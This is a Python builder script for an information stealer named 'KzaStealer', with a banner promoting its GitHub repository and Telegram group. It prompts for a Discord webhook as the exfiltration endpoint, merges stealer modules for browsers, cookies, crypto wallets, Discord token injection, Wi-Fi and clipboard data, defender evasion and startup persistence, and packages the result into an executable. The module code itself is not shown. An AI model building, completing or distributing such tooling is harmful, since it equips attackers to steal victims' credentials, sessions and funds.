import os
import subprocess
import sys
import re
import shutil  # For copying files

print("""
────────────────────────────────────────────────────────────────
                    This tool is developed by Cokza
────────────────────────────────────────────────────────────────

If you find it helpful, please:

1. Give it a star on GitHub:
   https://github.com/Cokza/KzaStealer

2. Join the Telegram group for updates:
   https://t.me/DscDevTools

────────────────────────────────────────────────────────────────
""")


# List of files to merge
files_to_merge = [
    "startup.py",
    "defender.py",
    "blacklist.py",
    "screen.py",
    "systeminfo.py",
    "browser.py",
    "cookies.py",
    "files.py",
    "wallet.py",
    "discord.py",
    "Injection.py",
    "telegram.py",
    "antispam.py",
    "games.py",
    "wifi.py",
    "clipboard.py"
]

# Validate Discord webhook URL
def is_valid_discord_webhook(url):
    # Regex to validate the URL
    regex = r'^https://discord\.com/api/webhooks/\d+/[A-Za-z0-9_-]+$'
    return re.match(regex, url) is not None

# Prompt the user to enter the webhook URL and validate it
def get_discord_webhook_url():
    while True:
        webhook_url = input("Please enter the Discord WEBHOOK URL: ")
        if is_valid_discord_webhook(webhook_url):
            return webhook_url
        else:
            print("Invalid Discord Webhook URL format. Please enter a valid webhook URL.")

# Merge all files into one script
def merge_files():
    with open("script.py", "w", encoding="utf-8") as script_file:
        # Add a comment at the beginning of the file
        script_file.write("# Combined script with Webhook URL replaced\n\n")
        
        for file in files_to_merge:
            file_path = os.path.join("src", file)
            if os.path.exists(file_path):
                try:
                    with open(file_path, "r", encoding="utf-8") as f:
                        content = f.read()
                        # Add the file name as a comment to distinguish it
                        script_file.write(f"\n\n# --- Start of {file} ---\n")
                        script_file.write(content)
                        script_file.write(f"\n\n# --- End of {file} ---\n\n")
                except UnicodeDecodeError:
                    print(f"Warning: Could not read file {file} due to incorrect encoding.")
                    continue
            else:
                print(f"File {file} not found in 'src' folder.")

# Replace WEBHOOK_URL in the script with the actual webhook URL
def replace_webhook_in_script(webhook_url):
    script_path = "script.py"
    if os.path.exists(script_path):
        try:
            with open(script_path, "r", encoding="utf-8") as f:
                content = f.read()

            # Replace all occurrences of 'WEBHOOKS_URL' with the webhook URL
            content = content.replace("WEBHOOKS_URL", webhook_url)

            # Save the changes to script.py
            with open(script_path, "w", encoding="utf-8") as f:
                f.write(content)
            print(f"Replaced 'WEBHOOKS_URL' in {script_path}.")
        except UnicodeDecodeError:
            print(f"Warning: Could not read file {script_path} due to incorrect encoding.")

# Check if pyinstaller is installed, and install it if not
def check_and_install_pyinstaller():
    try:
        # Check if pyinstaller is installed
        subprocess.check_call([sys.executable, "-m", "pip", "show", "pyinstaller"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError:
        # Install pyinstaller if not found
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
        
# Convert the script to an executable using pyinstaller
def create_exe():
    try:
        # Try using PyInstaller
        subprocess.check_call([sys.executable, "-m", "PyInstaller", "script.py"])
        print("Successfully converted the script to exe!")
    except subprocess.CalledProcessError as e:
        print(f"Error occurred while converting the script: {e}")

# Main execution
if __name__ == "__main__":
    check_and_install_pyinstaller()  # Ensure PyInstaller is installed
    webhook_url = get_discord_webhook_url()  # Prompt for the webhook URL
    merge_files()  # Merge files into script.py
    replace_webhook_in_script(webhook_url)  # Replace WEBHOOK_URL with the actual URL
    create_exe()  # Convert the script to an exe using pyinstaller
